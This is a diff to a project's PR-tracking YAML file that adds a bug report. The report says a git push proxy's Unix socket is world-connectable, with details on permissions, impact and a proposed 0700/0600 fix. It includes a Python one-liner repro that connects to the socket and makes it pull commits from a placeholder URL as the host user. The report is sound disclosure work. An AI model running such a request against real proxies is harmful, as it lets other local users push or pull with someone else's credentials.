@@ -9,7 +9,7 @@ project:
   repo: https://github.com/mjtomei/project_manager.git
   base_branch: master
   backend: github
-  active_pr: pr-001
+  active_pr: pr-e618b9c
   guide_deps_reviewed: true
   repo_id: 828c8d0a91034cd541f443dd0aee62961e2af75a
   last_pr_sync: '2026-03-02T01:48:48.618942+00:00'
@@ -36245,3 +36245,38 @@ prs:
       pr-748e708.'
     created_at: '2026-10-27T08:10:08Z'
     last_edited: '2026-10-27T08:10:08Z'
+- id: pr-e618b9c
+  plan: bugs
+  title: 'Push proxy socket is world-connectable: any local user can push/pull as
+    the host user'
+  branch: pm/pr-e618b9c-push-proxy-socket-is-world-connectable-any-local-u
+  status: pending
+  depends_on: []
+  description: 'pm_core/push_proxy.py PushProxy.start() chmods the proxy socket 0o777
+    and the socket directory is created by os.makedirs with the default mode (0755),
+    both under world-writable /tmp (/tmp/pm-push-proxy-*/push.sock). The daemon runs
+    git as the host user with host credentials, so any local user can connect and
+    issue {"cmd":"pull","args":["<url>","<ref>"]} to merge attacker-controlled commits
+    into a served PR worktree, or {"cmd":"push","args":["origin","<allowed-branch>"]}
+    to push to the PR branch as the user. Repro: as another local user, `python3 -c
+    "import socket,json; s=socket.socket(socket.AF_UNIX); s.connect(\"/tmp/pm-push-proxy-<tag>-<pr>-<token>/push.sock\");
+    s.sendall((json.dumps({\"cmd\":\"pull\",\"args\":[\"https://example.com/x.git\",\"main\"]})+\"\n\").encode());
+    print(s.recv(4096))"` while a container proxy is running. Restricted (not fixed)
+    by pr-748e708 spec R4, which now rejects a request naming any workdir other than
+    the proxy own one, so the exposure is limited to the served workdir; the allowed-branch
+    and dangerous-flag checks still apply. Fix direction: stop relying on world-writable
+    /tmp - create the socket root as a 0700 directory (e.g. $XDG_RUNTIME_DIR/pm or
+    ~/.pm/run) with a 0600 socket. The container process runs as the host uid in both
+    supported modes (docker: useradd -u host_uid + exec -u pm; podman: --userns=keep-id),
+    so it does not need world access. That would also retire most of the /tmp squatting/symlink/ownership
+    guards in push_proxy.py. Needs a decision on the container-uid assumption before
+    changing the mode, since a wrong assumption breaks every container push.'
+  agent_machine: null
+  gh_pr: null
+  gh_pr_number: null
+  created_at: '2026-10-27T20:41:33.365173+00:00'
+  updated_at: '2026-10-27T20:41:33.365173+00:00'
+  started_at: null
+  reviewed_at: null
+  merged_at: null
+  notes: []
